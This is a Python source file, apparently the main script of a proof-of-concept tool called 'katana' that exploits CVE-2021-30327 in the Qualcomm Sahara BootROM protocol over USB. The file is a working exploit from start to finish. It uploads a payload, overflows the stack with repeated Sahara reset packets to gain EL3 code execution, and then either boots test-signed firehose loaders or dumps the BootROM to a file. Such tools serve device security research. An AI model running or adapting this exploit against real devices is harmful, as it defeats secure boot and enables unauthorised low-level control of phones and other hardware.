#!/usr/bin/env python3
#
# SPDX-FileCopyrightText: 2026 Daniel Grobert <danalexgro@gmail.com>
# SPDX-License-Identifier: AGPL-3.0-or-later
#

import shutil
import usb.core
import usb.util
import usb.backend.libusb1
import libusb
import argparse
import struct
import sys
import os
import coloredlogs
import logging
import re
from time import sleep
from struct import pack
from soc_data import SOC_DATA
from modules.upload import * 
from modules.sahara import *

logger  = logging.getLogger(__name__)

def auto_int(x): return int(x, 0)
def main():
    coloredlogs.install(
        level="DEBUG",
        fmt="%(asctime)s %(message)s",
        level_styles={
            'debug': {'color': 208, 'bold': True}, # Orange
            'info': {'color': 'cyan', 'bold': True},
            'warning': {'color': 'white', 'bold': True},
            'error': {'color': 'yellow', 'bold': True},
            'critical': {'color': 'red', 'bold': True},
        },
        field_styles={
            'asctime': {'color': 'blue', 'bold': True},
            'levelname': {'bold': True},
        }
    )

    logger.debug(r"""

88                                                                   
88                       ,d                                          
88                       88                                          
88   ,d8   ,adPPYYba,  MM88MMM  ,adPPYYba,  8b,dPPYba,   ,adPPYYba,  
88 ,a8"    ""     `Y8    88     ""     `Y8  88P'   `"8a  ""     `Y8  
8888[      ,adPPPPP88    88     ,adPPPPP88  88       88  ,adPPPPP88  
88`"Yba,   88,    ,88    88,    88,    ,88  88       88  88,    ,88  
88   `Y8a  `"8bbdP"Y8    "Y888  `"8bbdP"Y8  88       88  `"8bbdP"Y8                                                   
                                    
    """)

    print("Qualcomm BootROM Exploit - CVE-2021-30327")
    print("Version 2.0 (c) 2025 Daniel224455 <danalexgro@gmail.com> - github.com/Daniel224455/katana")
    parser = argparse.ArgumentParser(description="A PoC for the CVE-2021-30327 vulnerability in Qualcomm Sahara")
    parser.add_argument('-s', '--soc', type=str, help="SoC model", required=True)
    parser.add_argument('-e', '--exploit', type=str, help="Exploit PBL (CVE-2021-30327) with a payload", required=True)
    parser.add_argument('-f', '--firehose', type=str, help="DevPrg image in case the payload reinitializes Sahara", required=False)
    parser.add_argument('-v', '--verbose', help="Enable to view TX/RX Sahara logs", action='store_true')
    parser.add_argument('-pid', help="Override USB PID (default 0x9008)", type=auto_int, default=0x9008, required=False)
    parser.add_argument('-vid', help="Override USB VID (default 0x05C6)", type=auto_int, default=0x05C6, required=False)

    args = parser.parse_args()
    soc = args.soc

    if args.exploit and not os.path.isfile(args.exploit):
        logger.critical(f"Exploit payload \"{args.exploit}\" does not exist!")
        exit()

    if args.firehose and not os.path.isfile(args.firehose):
        logger.critical(f"Firehose file \"{args.firehose}\" does not exist!")
        exit()

    if not soc in SOC_DATA:
        logger.critical(f"Selected SoC has no entry in soc_data.py!")
        exit()
    else:
        logger.debug(f"Selected SoC: {soc}")    

    EDLDevice.verbose = args.verbose
    EDLDevice.pid = args.pid
    EDLDevice.vid = args.vid

    edl = EDLDevice() 
    if not edl.connect():
        raise SystemExit(1)
    
    # Read Sahara hello packet
    data = edl.read(size=0x30)

    cmd, length = struct.unpack_from('<II', data, 0)

    if cmd == SAHARA_HELLO_ID: 
        cmd, length, ver, ver_min, max_pkt, mode = struct.unpack_from('<IIIIII', data, 0)
        logger.info(f"Sahara version {ver}")
        if mode == 0x0:
            logger.info(f"Device is in PBL Sahara")
        else:
            logger.info(f"Unknown mode, please reboot into PBL Sahara")
            exit()  

        # Attempting to detect the SoC will result in a buffer too small 
        # error while sending the payload. 

        if args.exploit:  
            logger.info("Starting exploit")

            send_hello_resp(edl, mode, ver_min, SAHARA_MODE_IMAGE_TX_COMPLETE, ver)

            with open(args.exploit, "rb") as f:
                check_payload = f.read()
            coyote_payload = 1 if b"Coyote-Napali" in check_payload else 0  
            dump_payload = 1 if b"PBLDump" in check_payload else 0  

            if coyote_payload == 1:
                logger.info("Coyote payload detected")

            upload_exploit_payload(edl, args.exploit, soc)

            # Check if Sahara stopped requesting data
            check_xfr_end = edl.read(size=0x10)
            (xfr_end_pkt,) = struct.unpack_from('<I', check_xfr_end, 0)
            if xfr_end_pkt == SAHARA_END_IMAGE_TX_ID: 
                logger.info("BootROM received all requested data")
            else:
                logger.error("The BootROM is not satisfied with the amount of sent data")
                exit()    

            logger.info("Corrupting memory beyond available stack space")
            # Corrupt memory beyond the stack space (0x3000)
            for _ in range(SOC_DATA[soc]["reset_cnt"]):
                # 0x13 calls into boot_sahara_entry
                # each iteration that goes back into boot_sahara_process_packets
                # decrements the SP by 0x60 bytes (on NapaliV2)
                edl.write(bytes([SAHARA_RESET_STATE_MACHINE_ID]))
                edl.read(size=0x30)

            logger.warning("Executing Payload")    
            edl.write(SOC_DATA[soc]["finish_payload_rx_stage1"])
            edl.write(SOC_DATA[soc]["finish_payload_rx_stage2"])
            logger.warning("Got code execution in EL3, which means your BootROM is now pwned!")  
            sleep(0.5)

            if coyote_payload == 1:
                logger.warning("You can now run testsigned firehoses") 
                logger.info("Releasing USB after reinitialization by payload") 
                edl.close()
                logger.info("Reconnecting") 
                edl.connect()
                logger.info("Checking if Sahara was reinitialized correctly") 

                reinit_data = edl.read(size=0x30)    
                cmd_reinit, _ = struct.unpack_from('<II', reinit_data, 0)
                if cmd_reinit == SAHARA_HELLO_ID:
                    logger.info("Sahara was reinited correctly")
                else:
                    logger.error("Sahara was not reinitialized by the payload!")
                    exit()    

                # Reusing the args from the first Sahara packet is okay,
                # because nothing gets changed.    
                send_hello_resp(edl, mode, ver_min, SAHARA_MODE_IMAGE_TX_COMPLETE, ver)
                upload_loader(edl, args.firehose)
            elif dump_payload == 1: 
                text = check_payload.decode(errors="ignore")
                base = None
                end  = None

                for line in text.splitlines():
                    if "Base:" in line and "0x" in line:
                        hexpart = line.split("0x", 1)[1].strip()
                        if hexpart:
                            base = int(hexpart, 16)

                    elif "End:" in line and "0x" in line:
                        hexpart = line.split("0x", 1)[1].strip()
                        if hexpart:
                            end = int(hexpart, 16)
                logger.warning(f"Dumping memory from 0x{base:x} to 0x{end:x}")        
                dmpsz = end - base
                total = 0
                        
                with open(f"{soc}.bootrom.bin", "wb") as f:
                    while True:
                        try:
                            chunk = edl.read(size=0x400)
                        except usb.core.USBTimeoutError:
                            break
                        
                        if not chunk:
                            break
                        
                        f.write(chunk)
                        total += len(chunk)
                        if total >= dmpsz:
                            break

                edl.payload_read(size=0x400)               
                logger.warning(f"Dumped 0x{total:x} bytes to {soc}.bootrom.bin")    

            edl.close()
            logger.warning("Exploit finished!")     
            exit()

    elif cmd == 0x4: # PBL sends this if you sent an ELF and didn't do anything after
        logger.info(f"Reboot your device. SAHARA_END_TRANSFER")    
    else:
        logger.error(f"Unexpected Sahara command")        

    edl.close()

if __name__ == "__main__":
    main()